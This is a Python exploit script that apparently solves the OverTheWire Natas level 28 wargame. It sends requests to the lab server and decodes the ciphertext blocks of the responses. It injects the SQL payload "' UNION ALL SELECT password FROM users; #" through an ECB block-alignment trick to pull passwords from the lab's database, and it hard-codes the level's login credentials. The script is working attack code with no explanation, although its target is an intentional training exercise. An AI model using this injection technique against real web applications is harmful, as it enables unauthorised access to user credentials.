import requests
from urllib.parse import unquote
import base64

## Variables to establish connection with server
url = 'http://natas28.natas.labs.overthewire.org/'
username = 'natas28'
password = 'skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4'

input_query = 'A'


#Loop to print out the outputs of an increasing in size query

##for i in range(0,32):
##    response = requests.get(url, auth=(username, password), params={"query":input_query})
##    input_query += 'A'
##    temp = (base64.b64decode(unquote(response.url[60:]))).hex()
##    chunks_of_32 = [temp[i:i+32] for i in range(0, len(temp), 32)]
##    print((len(input_query)-1), "A's added:")
##    print("Number of blocks:", len(chunks_of_32))
##    for i in range(0, len(chunks_of_32)):
##        print(chunks_of_32[i])
##    print("\n")

#Code to input attack data
input_query2 = "AAAAAAAAA' UNION ALL SELECT password FROM users; #"
response2 = requests.get(url, auth=(username, password), params={"query":input_query2})
temp2 = (base64.b64decode(unquote(response2.url[60:]))).hex()
chunks_of_32_2 = [temp2[i:i+32] for i in range(0, len(temp2), 32)]
for i in range(0, len(chunks_of_32_2)):
        print(chunks_of_32_2[i])
